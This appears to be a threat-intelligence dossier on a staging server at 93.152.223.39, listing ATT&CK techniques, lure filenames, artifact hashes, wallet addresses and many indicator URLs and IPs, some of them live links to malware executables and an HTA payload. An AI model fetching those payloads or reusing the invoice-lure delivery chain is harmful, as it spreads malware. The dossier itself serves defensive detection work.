---
name: "Threat Cluster 93[.]152[.]223[.]39"
aliases: []
status: "tracking"
origin: "Unknown / observed staging infrastructure"
motivation: "Targeted reconnaissance, access brokerage, and exploitation of public-facing application services to stage persistent Adaptix/Cobalt Strike C2 beacons and harvest credentials."
targets: ["Enterprise Web & Application Backends","Municipal & Public Service Portals","Database & Middleware Infrastructure"]
firstSeen: "2026-08-19"
lastSeen: "2026-08-19"
tools: ["Havoc C2 Framework / Demon implant indicators","Cobalt Strike / CrossC2 indicators","MSHTA / HTA execution chain","Scheduled task persistence indicators","In-memory loader / injection primitives","Encoded / encrypted payload handling","Windows LNK phishing / execution lure","Disk-image based delivery chain","Embedded / decoded PE payload candidates","Cryptocurrency Wallet / Clipper or Ransomware Note Telemetry"]
ttps: ["T1071.001 - Application Layer Protocol: Web Protocols","T1218.005 - System Binary Proxy Execution: Mshta","T1053.005 - Scheduled Task/Job: Scheduled Task","T1055 - Process Injection","T1140 - Deobfuscate/Decode Files or Information","T1566.001 - Spearphishing Attachment","T1204.002 - Malicious File","T1027 - Obfuscated/Compressed Files and Information","T1552.004 - Private Keys","T1496 - Resource Hijacking"]
tags: ["threat-intelligence","dfir","malware-analysis"]
relatedPosts: ["investigation-93-152-223-39"]
featured: true
---

# Threat Cluster 93[.]152[.]223[.]39

> This dossier is generated from static acquisition and recursive analysis. Suspicious artifacts are preserved in **per-investigation encrypted quarantine** with a unique data key and are **not executed** by the pipeline.

### Evidence Coverage

| Metric | Value |
|---|---:|
| Acquired artifacts | 10 |
| Text artifacts | 6 |
| Binary/container artifacts | 4 |
| Unique acquired/decoded layers analyzed | 90 |
| Maximum recursive depth reached | 1 |
| Archive/disk-image entries extracted | 1 |
| PE candidates statically identified | 1 |
| Credential/key/token findings | 9 |
| Recursive queue exhausted within configured limits | Yes |

## Motivation & Objectives

### Strategic Motivation
Targeted reconnaissance, access brokerage, and exploitation of public-facing application services to stage persistent Adaptix/Cobalt Strike C2 beacons and harvest credentials.

### Operational Objectives
- **Command & Control Establishment**: Operationalizing persistent C2 teamservers and cross-platform listeners.
- **Public-Facing Application Exploitation**: Probing and weaponizing application vulnerabilities (e.g. JNDI, Fastjson, Rogue MySQL) against enterprise backends.
- **Credential Discovery**: Harvesting configuration secrets, database connection strings, and application authentication tokens.

### Inferred Target Profile
- Enterprise Web & Application Backends
- Municipal & Public Service Portals
- Database & Middleware Infrastructure

### Key Operational Findings

- Havoc C2 Framework / Demon implant indicators
- Cobalt Strike / CrossC2 indicators
- MSHTA / HTA execution chain
- Scheduled task persistence indicators
- In-memory loader / injection primitives
- Encoded / encrypted payload handling
- Windows LNK phishing / execution lure
- Disk-image based delivery chain
- Embedded / decoded PE payload candidates
- Cryptocurrency Wallet / Clipper or Ransomware Note Telemetry

### Credentials, Keys & Tokens (Redacted)

| Risk | Type | Redacted Value | Source / Layer |
|---|---|---|---|
| **Critical** | Private Cryptographic Key | `[REDACTED_PRIVATE_KEY_BLOCK]` | `hxxp://93.152.223.39:8089/lab.key` / L0 (acquired) |
| **Medium** | Ethereum (ETH) Wallet Address | `0xaa11b31c56dfc51586892d5a46787cc2f399ba62` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |
| **Medium** | Monero (XMR) Wallet Address | `44ixvDr6APi1eejy8ufKoSDm3AuxaXcqZ8r5GsHbCdexgF5GSCw9vqCe3DztujfaG9hzy9q3W89vGA9vispTKx2xEUnbKLf` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |
| **Medium** | Ethereum (ETH) Wallet Address | `0x94350298feaeb7d7fba30385552766b74562ca68` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |
| **Medium** | Monero (XMR) Wallet Address | `43NaXp6JgtpTRM8mLWh4bA5eVkcuk9BtVbzsMjMXLBcZ8gBPvAgD28ueB3cEEmtEriYLzmxVLN58HMPZbosarJQ3KBGwkQz` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |
| **Medium** | Ethereum (ETH) Wallet Address | `0x5d2a1f80d3343cdd7ef43009a3e5bb4fa98b3e83` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |
| **Medium** | Monero (XMR) Wallet Address | `47QJaeAekuZ8wkmCD1Q5ccZAs926bdeC8EHwNRJaBp5x6bmpxFJBjSVDjCcBUPcqKb9N8SM69Ps89b3dT5Mx6142MxVgVHV` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |
| **Medium** | Ethereum (ETH) Wallet Address | `0x9ec2222e83f235d8a24b4d6defa16090d6168e0b` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |
| **Medium** | Monero (XMR) Wallet Address | `448w1UJ5S6JdeZRJiibNmDbm9zXRvzdVsTMoUEshUXjgGSA1EbwmBDVagrYcNy92bLiSm3fTtTmasaktw3b6RjtZ7HzEcTN` | `hxxp://93.152.223.39:8089/https.log` / L0 (acquired) |

### Verified Indicators

| Type | Defanged Value / Hash | Context | Confidence |
|---|---|---|---|
| **Investigated Host** | `93[.]152[.]223[.]39` | User-supplied investigated host | High (observed) |
| **Service Endpoint** | `93[.]152[.]223[.]39:8089` | User-supplied investigated HTTP(S) service | High (observed) |
| **SHA-256 Hash** | `95a389e97f8585e45f560f8efdec718eb62b5cc72fac9d154aa4244e0d37f758` | Acquired artifact: akt1842.dat (Raw Data / Unknown Format) | High (computed) |
| **SHA-256 Hash** | `a0bd788d2734ff386ac2ab06f94e7f87eb684fc67786ea9ce5bf4f949415d3cf` | Acquired artifact: https.log (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `09ada70d8bbeba035e7b8085d14c3026256ec0f6b44d79c6750b9e3bca421a42` | Acquired artifact: lab.crt (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `a25ea89a0bbfbff2a1a43ed7e5a82f858f3d2c256cb91951a4d3806d2fb8021c` | Acquired artifact: lab.key (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `633b308d9d7392166e8f3a529682d174b8ea025efb58c374b1c9cc320b7f3065` | Acquired artifact: lab_rti_https.py (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `3cb7a30932f436bb04768ffc5642e793f2cee7d7e18394b855aac56dbe1d8077` | Acquired artifact: Payment invoice INV-15468869 13.08.2026 PrivatBank receipt.iso (ISO 9660 Disk Image) | High (computed) |
| **SHA-256 Hash** | `ca4ba9fd58fd7f7b9752e7ebc5ae048c2567f50add253ab9d5f10c3e89acdf9b` | Acquired artifact: Payment invoice INV-15468869 13.08.2026 PrivatBank.pdf.lnk (Windows Shell Link (LNK)) | High (computed) |
| **SHA-256 Hash** | `f8b0b7e53c36cf4147526f692eca5bf98aa7206f13990c02b9270e04c341e5c0` | Acquired artifact: pisos.bin (Raw Data / Unknown Format) | High (computed) |
| **SHA-256 Hash** | `c95af43daad298c7c6f66e11ed6a811a020617f745d67516996835d69098754d` | Acquired artifact: README_LAB.txt (Plain/Textual Content) | High (computed) |
| **SHA-256 Hash** | `cb8e5203b223994e242f64100404d643766b4b5d00c1ea94f63005e021464e01` | Acquired artifact: win.hta (Plain/Textual Content) | High (computed) |
| **Embedded/Decoded PE SHA-256** | `4e0548ca06cd72221c455c67f1c1ad82d6f26d04da38a22a0b9a4a3b20442ae1` | Windows PE DLL Candidate from pisos.bin | High (computed) |
| **URL** | `hxxps://startpage[.]com/sp/search?abp=1&query=amazon&cat=web` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://botscout[.]com/test/?ip=93[.]152[.]223[.]39` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]roblox[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://1fichier[.]com/?ni53tht7pr2ucpgkfaq7` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://simpleapi[.]majestic[.]com/sapi/GetBacklinkStats?items=3&item0=http%3A%2F%2Fwww.google.com%2F&item1=www.google.com&item2=google.com&sak=SL3CKCME3Y&datasource=Fresh` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://proxyjudge[.]us/judge.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]axs[.]com/uk` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://m[.]facebook[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://gs[.]yandex[.]com/search?text=amazon` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://ipcheck1[.]jdownloader[.]org` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://ip[.]sb/azenv` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]twitch[.]tv/rmcretro` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://www[.]stopforumspam[.]com/ipcheck/93.152.223.39` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://httpheader[.]net/azenv.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://api[.]ipify[.]org/?format=raw` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://telegram[.]org/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://html[.]duckduckgo[.]com/html?q=amazon` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://pascal.hoez[.]free[.]fr/azenv.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://text[.]ru/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www.ticketmaster[.]co[.]uk/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]yellowpages[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]zapmeta[.]com/?q=amazon&vid=7ae5a7c6-de3a-4698-9927-2786000b79b6` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://ipinfo[.]io/ip` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://azenv[.]net/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://scripts[.]mit[.]edu/~jbarnold/demo/env.pl` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://newassets[.]hcaptcha[.]com/captcha/v1/a8cd801/static/hcaptcha.html` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]mojeek[.]com/search?q=amazon` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://www[.]sbjudge2[.]com/ip4.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]bing[.]com/search?q=amazon&FORM=PERE&count=20` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://www2t.biglobe[.]ne[.]jp/~take52/test/env.cgi` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://www[.]wfuchs[.]de/azenv.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www2[.]proxyswitcher[.]com/ss.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]instagram[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://wtfismyip[.]com/headers` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://lumtest[.]com/myip` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]soundcloud[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://translate.google.com/translate_a/single?client=t&sl=auto&tl=de&hl=de&dt=at&dt=bd&dt=ex&dt=ld&dt=md&dt=qca&dt=rw&dt=rm&dt=ss&dt=t&ie=UTF-8&oe=UTF-8&otf=2&ssel=0&tsel=0&kc=4&tk=821208.701606&q=This%20is%20a%20test.` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://checktrust[.]ru/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://x[.]com/i/flow/login` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://www[.]knowops[.]com/cgi-bin/textenv.pl` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://api[.]ipify[.]org/?format=raw` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://eu[.]supreme[.]com/collections/all` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://berlin[.]craigslist[.]org/search/jjj?query=software&sort=rel` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://us.search[.]yahoo[.]com/search?p=amazon` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://ip-api[.]com/json/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://scripts[.]mit[.]edu/~jbarnold/demo/env.pl` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]ebay[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]yelp[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]amazon[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]etsy[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://luisaranguren[.]com/proxyjudge.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]justone-fujioyama[.]jp/test/php/test.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]yell[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]izito[.]com/search?vid=ef878ab3-99f3-420e-aeba-84b2d84872ce&q=amazon` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://moz[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://check2[.]zennolab[.]com/proxy.php` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]kleinanzeigen[.]de/s-amiga/k0` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://search[.]brave[.]com/goggles?q=amazon&spellcheck=0` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://ipinfo[.]io/ip` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://jagerman[.]com/env.cgi` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www.google.com/recaptcha/api2/anchor?ar=1&k=6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-&co=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbTo0NDM.&hl=en&v=mhgGrlTs_PbFQOW4ejlxlxZn&size=normal&cb=5onchnjl84i3` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://check[.]getipintel[.]net/check.php?ip=93[.]152[.]223[.]39&contact=oxozygfoph0%40hotmail.com` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://www[.]reddit[.]com/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://proxyjudge[.]us/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://93.152.223.39:8089/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://161.118.248.208:3333/` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxp://93.152.223.39:8089/win.hta?id=1` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://github.com/ScavenokTeam/congenial-palm-tree/raw/refs/heads/main/burmalda.exe` | Observed in acquired/decoded evidence | High (string evidence) |
| **URL** | `hxxps://github.com/ScavenokTeam/congenial-palm-tree/raw/refs/heads/main/4h4zf2u6qsc641r0.exe` | Observed in acquired/decoded evidence | High (string evidence) |
| **IPv4** | `143[.]244[.]45[.]7` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `154[.]47[.]29[.]168` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `146[.]70[.]221[.]23` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `83[.]143[.]242[.]10` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]102[.]239[.]210` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `134[.]199[.]132[.]123` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `192[.]42[.]116[.]48` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `92[.]213[.]72[.]74` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `35[.]82[.]32[.]56` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `135[.]233[.]112[.]24` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `91[.]103[.]72[.]36` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `158[.]173[.]77[.]10` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]93[.]40[.]66` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `158[.]115[.]252[.]41` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `150[.]241[.]75[.]111` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]220[.]101[.]42` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]220[.]101[.]153` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `52[.]11[.]171[.]106` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `222[.]98[.]34[.]226` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `14[.]102[.]84[.]9` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `194[.]154[.]78[.]107` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `52[.]203[.]85[.]84` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `34[.]231[.]227[.]168` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `37[.]120[.]234[.]200` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `34[.]72[.]176[.]129` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `72[.]153[.]230[.]168` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `104[.]197[.]69[.]115` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `158[.]173[.]244[.]25` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `194[.]154[.]78[.]232` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `54[.]71[.]187[.]124` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `66[.]172[.]34[.]25` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `50[.]19[.]65[.]240` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]81[.]4[.]50` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]152[.]39[.]78` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `174[.]7[.]32[.]199` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `169[.]150[.]226[.]171` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `147[.]185[.]226[.]32` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `34[.]168[.]50[.]18` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `85[.]235[.]75[.]143` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `158[.]173[.]79[.]56` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `145[.]79[.]182[.]63` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `193[.]128[.]108[.]246` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]51[.]228[.]129` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]189[.]160[.]75` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `45[.]205[.]1[.]243` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `193[.]42[.]96[.]153` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `79[.]104[.]209[.]20` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `195[.]68[.]142[.]15` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `34[.]98[.]143[.]42` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `18[.]118[.]34[.]34` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]16[.]183[.]228` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `34[.]98[.]143[.]43` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `146[.]112[.]163[.]42` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `196[.]240[.]60[.]218` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]88[.]19[.]18` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `172[.]105[.]82[.]111` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `194[.]88[.]98[.]88` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `34[.]16[.]249[.]191` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]5[.]169[.]131` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]5[.]169[.]224` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `193[.]124[.]20[.]253` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]5[.]169[.]213` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]5[.]169[.]128` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]5[.]169[.]156` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]5[.]169[.]188` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]102[.]230[.]138` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `79[.]104[.]209[.]222` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `195[.]68[.]142[.]29` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `195[.]239[.]51[.]55` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `141[.]148[.]153[.]213` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]195[.]19[.]203` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `152[.]58[.]47[.]88` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `129[.]153[.]109[.]43` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `74[.]179[.]67[.]173` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `93[.]165[.]249[.]10` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `165[.]232[.]41[.]137` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `45[.]32[.]126[.]229` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `188[.]253[.]115[.]14` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `45[.]133[.]192[.]7` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]102[.]227[.]85` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]88[.]98[.]73` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]50[.]212[.]200` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `188[.]166[.]206[.]18` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `157[.]245[.]77[.]56` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `20[.]151[.]173[.]182` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `113[.]196[.]59[.]51` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `206[.]81[.]7[.]6` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `167[.]172[.]131[.]120` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]130[.]168[.]2` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `31[.]154[.]162[.]118` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `15[.]204[.]226[.]118` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `170[.]62[.]100[.]149` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `15[.]204[.]113[.]181` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `147[.]135[.]46[.]197` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `108[.]165[.]113[.]10` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]55[.]5[.]249` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `147[.]135[.]68[.]179` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `50[.]218[.]250[.]7` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `205[.]169[.]39[.]12` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `205[.]169[.]39[.]22` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `205[.]169[.]39[.]7` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `64[.]190[.]76[.]2` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `35[.]152[.]95[.]17` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `79[.]104[.]209[.]157` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `165[.]154[.]236[.]229` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `14[.]33[.]131[.]72` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `158[.]173[.]164[.]17` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `37[.]252[.]191[.]29` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `146[.]70[.]128[.]221` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `212[.]47[.]250[.]142` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `94[.]231[.]206[.]36` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `135[.]136[.]0[.]18` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `79[.]117[.]247[.]21` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `52[.]32[.]240[.]62` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `94[.]231[.]206[.]3` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `204[.]16[.]172[.]106` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `50[.]31[.]235[.]131` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `193[.]138[.]7[.]158` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `69[.]94[.]74[.]230` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `80[.]87[.]206[.]19` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `57[.]181[.]129[.]243` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `207[.]102[.]138[.]19` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `135[.]125[.]173[.]82` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `178[.]249[.]214[.]6` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `118[.]194[.]228[.]7` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `61[.]4[.]117[.]30` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]246[.]208[.]88` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `205[.]169[.]39[.]6` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `205[.]169[.]39[.]58` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `96[.]126[.]104[.]20` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `64[.]236[.]113[.]23` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]220[.]101[.]45` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]220[.]101[.]186` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `192[.]76[.]153[.]253` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `52[.]230[.]237[.]21` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `192[.]42[.]116[.]68` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]220[.]100[.]249` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `192[.]42[.]116[.]145` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]129[.]187[.]38` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `79[.]116[.]174[.]66` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `45[.]89[.]188[.]219` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `8[.]219[.]1[.]0` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `37[.]19[.]220[.]15` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `193[.]93[.]219[.]166` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `216[.]218[.]206[.]66` | Observed in acquired/decoded evidence | Medium (context required) |
